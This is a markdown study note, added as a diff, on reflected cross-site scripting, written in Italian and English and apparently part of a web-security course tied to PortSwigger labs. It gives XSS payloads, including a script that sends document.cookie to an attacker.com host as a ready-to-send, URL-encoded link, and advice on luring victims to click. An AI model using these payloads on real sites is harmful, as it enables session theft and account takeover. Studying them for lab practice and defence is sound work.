@@ -1,0 +1,117 @@
+# Reflected XSS
+
+**Difficolta:** Intermediate
+**Time to Master:** 1.5h
+**Prerequisiti:** [01-XSS-Fundamentals.md](01-XSS-Fundamentals.md)
+**Lab:** PortSwigger Academy — Reflected XSS
+
+---
+
+## Obiettivo
+
+Sfruttare parametri riflessi immediatamente nella response (query string, form) per costruire un link malevolo che esegue JS nel browser della vittima al click.
+
+---
+
+## Concetti chiave
+
+### Vettore d'attacco tipico
+
+```
+http://target.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+```
+
+La vittima deve cliccare il link (social engineering, email, messaggio); l'esecuzione avviene nel contesto/sessione della vittima, non dell'attaccante.
+
+---
+
+## Strumenti
+
+| Tool | Comando base | Output | Note |
+|------|---------------|--------|------|
+| Burp Repeater | test parametro per parametro | conferma riflessione | manuale |
+| Browser | apertura link diretta | esecuzione reale | verifica finale |
+
+---
+
+## Payload / Esempi
+
+### Esempio 1: reflected XSS su parametro di ricerca
+
+```
+http://target.com/search?q=<script>alert(document.domain)</script>
+```
+
+**Output atteso:** popup con il dominio del target — conferma che il payload esegue nel contesto dell'origine corretta.
+
+### Esempio 2: reflected XSS in attributo HTML
+
+Se l'input finisce in `<input value="INPUT">`:
+```
+" onfocus="alert(1)" autofocus="
+" onmouseover="alert(1)
+```
+
+**Spiegazione:** chiudi l'attributo con `"` e aggiungi un event handler; `autofocus` forza l'esecuzione senza bisogno di interazione utente.
+
+### Esempio 3: costruire il link completo per invio alla vittima
+
+```
+http://target.com/search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fc%3F%27%2Bdocument.cookie%3C%2Fscript%3E
+```
+
+**Spiegazione:** URL-encoda sempre il payload completo prima di inviarlo come link, altrimenti caratteri speciali possono rompere l'URL stesso o essere interpretati male dal client email/chat.
+
+---
+
+## Evasion / Bypass Techniques
+
+Vedi [06-WAF-Evasion.md](06-WAF-Evasion.md). Nota specifica per reflected: se l'app riflette il payload ma lo tronca a X caratteri, usa payload corti tipo `<svg/onload=alert(1)>` invece di script lunghi.
+
+---
+
+## Lab Hands-On
+
+### Lab 1: PortSwigger — Reflected XSS into attribute with angle brackets HTML-encoded
+**Obiettivo:** bypassare encoding parziale e ottenere esecuzione
+**Difficulty:** Medio
+**Time:** 30 min
+
+**Walkthrough breve:**
+1. Osserva che `<`/`>` sono encodati ma le quote no
+2. Chiudi l'attributo con `"` e usa event handler
+3. Conferma esecuzione
+
+---
+
+## Common Mistakes
+
+- Testare solo nel browser senza controllare il sorgente -> l'encoding parziale (solo `<>` ma non `"`) si vede solo guardando l'HTML generato
+- Dimenticare l'URL-encoding quando condividi il link PoC -> il link puo rompersi o essere alterato dal client di destinazione
+
+---
+
+## Link Utili
+
+- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
+
+---
+
+## Connessioni
+
+- **Prerequisito:** [01-XSS-Fundamentals.md](01-XSS-Fundamentals.md)
+- **Prossimo Step:** [03-Stored-XSS.md](03-Stored-XSS.md)
+
+---
+
+## Checklist di padronanza
+
+- [ ] So costruire un PoC reflected XSS completo (link cliccabile)
+- [ ] So adattare il payload al contesto (HTML body vs attributo)
+- [ ] So URL-encodare correttamente il link finale
+
+---
+
+## Note personali
+
+_(spazio libero)_
